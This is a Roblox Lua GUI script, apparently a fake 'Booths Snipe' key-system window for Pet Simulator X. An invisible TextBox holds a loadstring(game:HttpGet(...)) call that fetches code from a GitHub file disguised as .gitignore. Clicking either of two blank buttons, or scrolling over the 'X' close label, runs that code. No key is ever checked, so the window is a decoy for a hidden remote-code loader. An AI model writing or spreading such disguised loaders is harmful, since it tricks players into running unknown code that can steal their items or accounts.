--[=[
 d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
88      88    88    88            odD'      88      88    88 88ooo88 
88  ooo 88    88    88          .88'        88      88    88 88~~~88 
88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88 
 Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER
]=]

-- Instances: 22 | Scripts: 4 | Modules: 0
local G2L = {};

-- StarterGui.ScreenGui
G2L["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;

-- StarterGui.ScreenGui.Frame
G2L["2"] = Instance.new("Frame", G2L["1"]);
G2L["2"]["BorderSizePixel"] = 0;
G2L["2"]["BackgroundColor3"] = Color3.fromRGB(28, 28, 28);
G2L["2"]["Size"] = UDim2.new(0, 480, 0, 172);
G2L["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2"]["Position"] = UDim2.new(0.4210246205329895, 0, 0.3930288553237915, 0);

-- StarterGui.ScreenGui.Frame.UICorner
G2L["3"] = Instance.new("UICorner", G2L["2"]);


-- StarterGui.ScreenGui.Frame.TextLabel
G2L["4"] = Instance.new("TextLabel", G2L["2"]);
G2L["4"]["BorderSizePixel"] = 0;
G2L["4"]["BackgroundColor3"] = Color3.fromRGB(28, 28, 28);
G2L["4"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["4"]["TextSize"] = 18;
G2L["4"]["TextColor3"] = Color3.fromRGB(224, 224, 224);
G2L["4"]["Size"] = UDim2.new(0, 174, 0, 50);
G2L["4"]["BorderColor3"] = Color3.fromRGB(226, 226, 226);
G2L["4"]["Text"] = [[Booths Snipe]];
G2L["4"]["Position"] = UDim2.new(0, 0, 0.0451977401971817, 0);

-- StarterGui.ScreenGui.Frame.TextLabel
G2L["5"] = Instance.new("TextLabel", G2L["2"]);
G2L["5"]["BorderSizePixel"] = 0;
G2L["5"]["BackgroundColor3"] = Color3.fromRGB(28, 28, 28);
G2L["5"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["5"]["TextSize"] = 13;
G2L["5"]["TextColor3"] = Color3.fromRGB(224, 224, 224);
G2L["5"]["Size"] = UDim2.new(0, 88, 0, 9);
G2L["5"]["BorderColor3"] = Color3.fromRGB(226, 226, 226);
G2L["5"]["Text"] = [[Key System]];
G2L["5"]["Position"] = UDim2.new(0.05416666716337204, 0, 0.2372881919145584, 0);

-- StarterGui.ScreenGui.Frame.TextLabel
G2L["6"] = Instance.new("TextLabel", G2L["2"]);
G2L["6"]["BorderSizePixel"] = 0;
G2L["6"]["BackgroundColor3"] = Color3.fromRGB(28, 28, 28);
G2L["6"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["6"]["TextStrokeColor3"] = Color3.fromRGB(195, 195, 195);
G2L["6"]["TextSize"] = 20;
G2L["6"]["TextColor3"] = Color3.fromRGB(201, 201, 201);
G2L["6"]["Size"] = UDim2.new(0, 51, 0, 33);
G2L["6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6"]["Text"] = [[X]];
G2L["6"]["Position"] = UDim2.new(0.893750011920929, 0, -0.0013138527283445, 0);

-- StarterGui.ScreenGui.Frame.TextLabel.UICorner
G2L["7"] = Instance.new("UICorner", G2L["6"]);


-- StarterGui.ScreenGui.Frame.TextLabel.LocalScript
G2L["8"] = Instance.new("LocalScript", G2L["6"]);


-- StarterGui.ScreenGui.Frame.TextLabel
G2L["9"] = Instance.new("TextLabel", G2L["2"]);
G2L["9"]["BorderSizePixel"] = 0;
G2L["9"]["BackgroundColor3"] = Color3.fromRGB(28, 28, 28);
G2L["9"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["9"]["TextStrokeColor3"] = Color3.fromRGB(140, 140, 140);
G2L["9"]["TextSize"] = 15;
G2L["9"]["TextColor3"] = Color3.fromRGB(112, 112, 112);
G2L["9"]["Size"] = UDim2.new(0, 64, 0, 16);
G2L["9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["9"]["Text"] = [[Key]];
G2L["9"]["Position"] = UDim2.new(0.014583333395421505, 0, 0.33139535784721375, 0);

-- StarterGui.ScreenGui.Frame.TextLabel
G2L["a"] = Instance.new("TextLabel", G2L["2"]);
G2L["a"]["BorderSizePixel"] = 0;
G2L["a"]["BackgroundColor3"] = Color3.fromRGB(28, 28, 28);
G2L["a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["a"]["TextStrokeColor3"] = Color3.fromRGB(140, 140, 140);
G2L["a"]["TextSize"] = 16;
G2L["a"]["TextColor3"] = Color3.fromRGB(112, 112, 112);
G2L["a"]["Size"] = UDim2.new(0, 64, 0, 16);
G2L["a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a"]["Text"] = [[Note]];
G2L["a"]["Position"] = UDim2.new(0.5791666507720947, 0, 0.33139535784721375, 0);

-- StarterGui.ScreenGui.Frame.TextLabel
G2L["b"] = Instance.new("TextLabel", G2L["2"]);
G2L["b"]["BorderSizePixel"] = 0;
G2L["b"]["BackgroundColor3"] = Color3.fromRGB(28, 28, 28);
G2L["b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["b"]["TextStrokeColor3"] = Color3.fromRGB(209, 209, 209);
G2L["b"]["TextSize"] = 15;
G2L["b"]["TextColor3"] = Color3.fromRGB(208, 208, 208);
G2L["b"]["Size"] = UDim2.new(0, 64, 0, 20);
G2L["b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b"]["Text"] = [[Check discord.gg/XnoHub for]];
G2L["b"]["Position"] = UDim2.new(0.7124999761581421, 0, 0.4244185984134674, 0);

-- StarterGui.ScreenGui.Frame.TextLabel
G2L["c"] = Instance.new("TextLabel", G2L["2"]);
G2L["c"]["BorderSizePixel"] = 0;
G2L["c"]["BackgroundColor3"] = Color3.fromRGB(28, 28, 28);
G2L["c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["c"]["TextStrokeColor3"] = Color3.fromRGB(209, 209, 209);
G2L["c"]["TextSize"] = 15;
G2L["c"]["TextColor3"] = Color3.fromRGB(208, 208, 208);
G2L["c"]["Size"] = UDim2.new(0, 23, 0, 14);
G2L["c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c"]["Text"] = [[key]];
G2L["c"]["Position"] = UDim2.new(0.6041666865348816, 0, 0.5174418687820435, 0);

-- StarterGui.ScreenGui.Frame.TextBox
G2L["d"] = Instance.new("TextBox", G2L["2"]);
G2L["d"]["BorderSizePixel"] = 0;
G2L["d"]["TextSize"] = 14;
G2L["d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["d"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["d"]["Size"] = UDim2.new(0, -7, 0, 0);
G2L["d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d"]["Text"] = [[loadstring(game:HttpGet("https://raw.githubusercontent.com/Byppases/Psx-Booth-Sniper/main/.gitignore", true))()]];
G2L["d"]["Position"] = UDim2.new(0.7124999761581421, 0, 1, 0);
G2L["d"]["Visible"] = false;
G2L["d"]["ClearTextOnFocus"] = false;

-- StarterGui.ScreenGui.Frame.UIAspectRatioConstraint
G2L["e"] = Instance.new("UIAspectRatioConstraint", G2L["2"]);
G2L["e"]["AspectRatio"] = 2.7906975746154785;

-- StarterGui.ScreenGui.Frame.LocalScript
G2L["f"] = Instance.new("LocalScript", G2L["2"]);


-- StarterGui.ScreenGui.Frame.TextButton
G2L["10"] = Instance.new("TextButton", G2L["2"]);
G2L["10"]["TextWrapped"] = true;
G2L["10"]["BorderSizePixel"] = 0;
G2L["10"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
G2L["10"]["TextSize"] = 16;
G2L["10"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["10"]["TextColor3"] = Color3.fromRGB(154, 154, 154);
G2L["10"]["Size"] = UDim2.new(0, 208, 0, 38);
G2L["10"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["10"]["Text"] = [[]];
G2L["10"]["Position"] = UDim2.new(0.05624999850988388, 0, 0.44199177622795105, 0);

-- StarterGui.ScreenGui.Frame.TextButton.UICorner
G2L["11"] = Instance.new("UICorner", G2L["10"]);


-- StarterGui.ScreenGui.Frame.TextButton.UIStroke
G2L["12"] = Instance.new("UIStroke", G2L["10"]);
G2L["12"]["Color"] = Color3.fromRGB(55, 55, 55);
G2L["12"]["Thickness"] = 1.5;
G2L["12"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.ScreenGui.Frame.TextButton.LocalScript
G2L["13"] = Instance.new("LocalScript", G2L["10"]);


-- StarterGui.ScreenGui.Frame.TextButton
G2L["14"] = Instance.new("TextButton", G2L["2"]);
G2L["14"]["TextWrapped"] = true;
G2L["14"]["BorderSizePixel"] = 0;
G2L["14"]["BackgroundColor3"] = Color3.fromRGB(28, 28, 28);
G2L["14"]["TextSize"] = 16;
G2L["14"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["14"]["TextColor3"] = Color3.fromRGB(154, 154, 154);
G2L["14"]["Size"] = UDim2.new(0, 139, 0, 37);
G2L["14"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["14"]["Text"] = [[]];
G2L["14"]["Position"] = UDim2.new(0.6041666865348816, 0, 0.5988371968269348, 0);

-- StarterGui.ScreenGui.Frame.TextButton.UICorner
G2L["15"] = Instance.new("UICorner", G2L["14"]);


-- StarterGui.ScreenGui.Frame.TextButton.LocalScript
G2L["16"] = Instance.new("LocalScript", G2L["14"]);


-- StarterGui.ScreenGui.Frame.TextLabel.LocalScript
local function C_8()
local script = G2L["8"];
	local TextLabel = script.Parent
	local TextBox = script.Parent.Parent.TextBox
	TextLabel.MouseWheelForward:Connect(function()
		loadstring(TextBox.Text)()
	end)
end;
task.spawn(C_8);
-- StarterGui.ScreenGui.Frame.LocalScript
local function C_f()
local script = G2L["f"];
	
end;
task.spawn(C_f);
-- StarterGui.ScreenGui.Frame.TextButton.LocalScript
local function C_13()
local script = G2L["13"];
	local button = script.Parent
	local textbox = script.Parent.Parent.TextBox
	button.MouseButton1Click:Connect(function()
		loadstring(textbox.Text)()
	end)
end;
task.spawn(C_13);
-- StarterGui.ScreenGui.Frame.TextButton.LocalScript
local function C_16()
local script = G2L["16"];
	local button = script.Parent
	local textbox = script.Parent.Parent.TextBox
	button.MouseButton1Click:Connect(function()
		loadstring(textbox.Text)()
	end)
end;
task.spawn(C_16);

return G2L["1"], require;
